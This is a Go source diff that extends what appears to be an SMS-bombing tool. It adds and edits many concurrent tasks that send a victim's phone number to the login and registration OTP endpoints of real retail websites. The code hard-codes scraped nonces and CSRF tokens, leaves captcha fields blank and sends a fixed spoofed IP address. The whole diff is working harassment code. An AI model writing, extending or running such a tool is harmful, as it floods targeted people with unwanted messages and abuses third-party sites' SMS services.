@@ -342,31 +342,71 @@ func main() {
 
 
 
+		// shimashoes.com (Registration - POST Form)
+		wg.Add(1)
+		tasks <- func() {
+			formData := url.Values{}
+			formData.Set("email", phone) 
+			sendFormRequest(ctx, "https://shimashoes.com/api/customer/member/register/", formData, &wg, ch) 
+		}
+		// eaccount.ir (SMS - POST JSON) 
+		wg.Add(1)
+		tasks <- func() {
+			payload := map[string]interface{}{
+				"mobile_phone": phone, 
+			}
+			sendJSONRequest(ctx, "https://eaccount.ir/api/v1/sessions/login_request", payload, &wg, ch)
+		}
 
-		// gitamehr.ir (SMS - POST Form) - نیاز به security token پویا (احتمال عدم موفقیت بالا)
+		// queenaccessories.ir (SMS - POST JSON) 
+		wg.Add(1)
+		tasks <- func() {
+			payload := map[string]interface{}{
+				"mobile_phone": phone, 
+			}
+			sendJSONRequest(ctx, "https://queenaccessories.ir/api/v1/sessions/login_request", payload, &wg, ch)
+		}
+
+		// vinaaccessory.com (SMS - POST JSON)
+		wg.Add(1)
+		tasks <- func() {
+			payload := map[string]interface{}{
+				"mobile_phone": phone,
+			}
+			sendJSONRequest(ctx, "https://vinaaccessory.com/api/v1/sessions/login_request", payload, &wg, ch)
+		}
+		// dastaneman.com (SMS - POST Form)
+		wg.Add(1)
+		tasks <- func() {
+			formData := url.Values{}
+			formattedPhone := "0098" + getPhoneNumberNoZero(phone)
+			formData.Set("mobile", formattedPhone)
+			sendFormRequest(ctx, "https://dastaneman.com/User/SendCode", formData, &wg, ch)
+		}
+		// gitamehr.ir (SMS - POST Form)
 		wg.Add(1)
 		tasks <- func() {
 			formData := url.Values{}
 			formData.Set("action", "mreeir_send_sms")
-			formData.Set("mobileemail", phone) // استفاده مستقیم از شماره تلفن ورودی
-			formData.Set("userisnotauser", "") // طبق نمونه خالی ارسال می‌شود
+			formData.Set("mobileemail", phone) 
+			formData.Set("userisnotauser", "") 
 			formData.Set("type", "mobile")
-			formData.Set("captcha", "") // طبق نمونه خالی ارسال می‌شود
-			formData.Set("captchahash", "") // طبق نمونه خالی ارسال می‌شود
-			formData.Set("security", "75d313bc3e") // این توکن پویا است
+			formData.Set("captcha", "") 
+			formData.Set("captchahash", "") 
+			formData.Set("security", "75d313bc3e") 
 			sendFormRequest(ctx, "https://gitamehr.ir/wp-admin/admin-ajax.php", formData, &wg, ch)
 		}
-		// 4hair.ir (SMS - POST Form) - نیاز به security token پویا (احتمال عدم موفقیت بالا)
+		// 4hair.ir (SMS - POST Form)
 		wg.Add(1)
 		tasks <- func() {
 			formData := url.Values{}
 			formData.Set("action", "mreeir_send_sms")
-			formData.Set("mobileemail", phone) // استفاده مستقیم از شماره تلفن ورودی
-			formData.Set("userisnotauser", "") // طبق نمونه خالی
+			formData.Set("mobileemail", phone)
+			formData.Set("userisnotauser", "") 
 			formData.Set("type", "mobile")
-			formData.Set("captcha", "") // طبق نمونه خالی
-			formData.Set("captchahash", "") // طبق نمونه خالی
-			formData.Set("security", "52771e6d1a") // این توکن پویا است
+			formData.Set("captcha", "") 
+			formData.Set("captchahash", "") 
+			formData.Set("security", "52771e6d1a") 
 			sendFormRequest(ctx, "https://4hair.ir/wp-admin/admin-ajax.php", formData, &wg, ch)
 		}
 		// titomarket.com (SMS - POST Form)
@@ -375,7 +415,7 @@ func main() {
 			formData := url.Values{}
 			formData.Set("route", "extension/websky_otp/module/websky_otp.send_code")
 			formData.Set("emailsend", "0")
-			formData.Set("telephone", phone) // استفاده مستقیم از شماره تلفن ورودی
+			formData.Set("telephone", phone) 
 			sendFormRequest(ctx, "https://titomarket.com/fa-ir/index.php?route=extension/websky_otp/module/websky_otp.send_code&emailsend=0", formData, &wg, ch)
 		}
 		// account724.com (SMS - POST Form)
@@ -384,19 +424,19 @@ func main() {
 			formData := url.Values{}
 			formData.Set("action", "stm_login_register")
 			formData.Set("type", "mobile")
-			formData.Set("input", phone) // استفاده مستقیم از شماره تلفن ورودی
+			formData.Set("input", phone) 
 			sendFormRequest(ctx, "https://account724.com/wp-admin/admin-ajax.php", formData, &wg, ch)
 		}
-		// novinparse.com (SMS - POST Form) - ipaddress ممکن است نیاز به تنظیم پویا داشته باشد
+		// novinparse.com (SMS - POST Form) 
 		wg.Add(1)
 		tasks <- func() {
 			formData := url.Values{}
 			formData.Set("Action", "SendVerifyCode")
-			formData.Set("mobile", phone) // استفاده مستقیم از شماره تلفن ورودی
-			formData.Set("verifyCode", "") // طبق نمونه شما خالی ارسال می‌شود
+			formData.Set("mobile", phone)
+			formData.Set("verifyCode", "") 
 			formData.Set("repeatFlag", "true")
 			formData.Set("Language", "FA")
-			formData.Set("ipaddress", "5.232.133.109") // ممکن است نیاز به IP واقعی ارسال کننده داشته باشد
+			formData.Set("ipaddress", "5.232.133.109") 
 			sendFormRequest(ctx, "https://novinparse.com/page/pageaction.aspx", formData, &wg, ch)
 		}
 		// api-atlasmode.alochand.com (SMS - POST Form)
@@ -404,16 +444,16 @@ func main() {
 		tasks <- func() {
 			formData := url.Values{}
 			formData.Set("version", "new2")
-			formData.Set("mobile", phone) // استفاده مستقیم از شماره تلفن ورودی
-			formData.Set("sdlkjcvisl", "uikjdknfs") // ارسال پارامتر ثابت از نمونه
+			formData.Set("mobile", phone) 
+			formData.Set("sdlkjcvisl", "uikjdknfs") 
 			sendFormRequest(ctx, "https://api-atlasmode.alochand.com/v1/customer/register-login?version=new2", formData, &wg, ch)
 		}
 		// api.pashikshoes.com (SMS - POST Form)
 		wg.Add(1)
 		tasks <- func() {
 			formData := url.Values{}
-			formData.Set("mobile", phone) // استفاده مستقیم از شماره تلفن ورودی
-			formData.Set("sdlkjcvisl", "uikjdknfs") // ارسال پارامتر ثابت از نمونه
+			formData.Set("mobile", phone) 
+			formData.Set("sdlkjcvisl", "uikjdknfs") 
 			sendFormRequest(ctx, "https://api.pashikshoes.com/v1/customer/register-login", formData, &wg, ch)
 		}
 		// api.paaakar.com (SMS - POST Form)
@@ -421,16 +461,16 @@ func main() {
 		tasks <- func() {
 			formData := url.Values{}
 			formData.Set("version", "new1")
-			formData.Set("mobile", phone) // استفاده مستقیم از شماره تلفن ورودی
-			formData.Set("sdlkjcvisl", "uikjdknfs") // ارسال پارامتر ثابت از نمونه
+			formData.Set("mobile", phone) 
+			formData.Set("sdlkjcvisl", "uikjdknfs") 
 			sendFormRequest(ctx, "https://api.paaakar.com/v1/customer/register-login?version=new1", formData, &wg, ch)
 		}
 		// api.elinorboutique.com (SMS - POST Form)
 		wg.Add(1)
 		tasks <- func() {
 			formData := url.Values{}
-			formData.Set("mobile", phone) // استفاده مستقیم از شماره تلفن ورودی
-			formData.Set("sdlkjcvisl", "uikjdknfs") // ارسال پارامتر ثابت از نمونه
+			formData.Set("mobile", phone)
+			formData.Set("sdlkjcvisl", "uikjdknfs") 
 			sendFormRequest(ctx, "https://api.elinorboutique.com/v1/customer/register-login", formData, &wg, ch)
 		}
 		// benedito.ir (SMS - POST Form)
@@ -438,26 +478,26 @@ func main() {
 		tasks <- func() {
 			formData := url.Values{}
 			formData.Set("version", "new1")
-			formData.Set("mobile", phone) // استفاده مستقیم از شماره تلفن ورودی
-			formData.Set("sdvssd45fsdv", "brtht33yjuj7s") // ارسال پارامتر ثابت از نمونه
+			formData.Set("mobile", phone) 
+			formData.Set("sdvssd45fsdv", "brtht33yjuj7s") 
 			sendFormRequest(ctx, "https://api.benedito.ir/v1/customer/register-login?version=new1", formData, &wg, ch)
 		}
-		// zzzagros.com (SMS - POST Form) - نیاز به nonce پویا (احتمال عدم موفقیت بالا)
+		// zzzagros.com (SMS - POST Form) 
 		wg.Add(1)
 		tasks <- func() {
 			formData := url.Values{}
 			formData.Set("action", "awsa-login-with-phone-send-code")
-			formData.Set("nonce", "9a4e9547c3") // این توکن پویا است
-			formData.Set("username", phone) // استفاده مستقیم از شماره تلفن ورودی
+			formData.Set("nonce", "9a4e9547c3") 
+			formData.Set("username", phone)
 			sendFormRequest(ctx, "https://www.zzzagros.com/wp-admin/admin-ajax.php", formData, &wg, ch)
 		}
-		// janebi.com (SMS - POST Form) - نیاز به csrf پویا (احتمال عدم موفقیت بالا)
+		// janebi.com (SMS - POST Form)
 		wg.Add(1)
 		tasks <- func() {
 			formData := url.Values{}
-			formData.Set("csrf", "4") // این توکن پویا است
-			formData.Set("user_mobile", phone) // استفاده مستقیم از شماره تلفن ورودی
-			formData.Set("confirm_code", "") // طبق نمونه خالی
+			formData.Set("csrf", "4") 
+			formData.Set("user_mobile", phone) 
+			formData.Set("confirm_code", "") 
 			formData.Set("popup", "1")
 			formData.Set("signin", "1")
 			sendFormRequest(ctx, "https://janebi.com/signin", formData, &wg, ch)
@@ -467,7 +507,7 @@ func main() {
 		tasks <- func() {
 			formData := url.Values{}
 			formData.Set("action", "logini_first")
-			formData.Set("login", phone) // استفاده مستقیم از شماره تلفن ورودی
+			formData.Set("login", phone)
 			sendFormRequest(ctx, "https://ubike.ir/wp-admin/admin-ajax.php", formData, &wg, ch)
 		}
 		// www.kanoonbook.ir (SMS - POST Form)
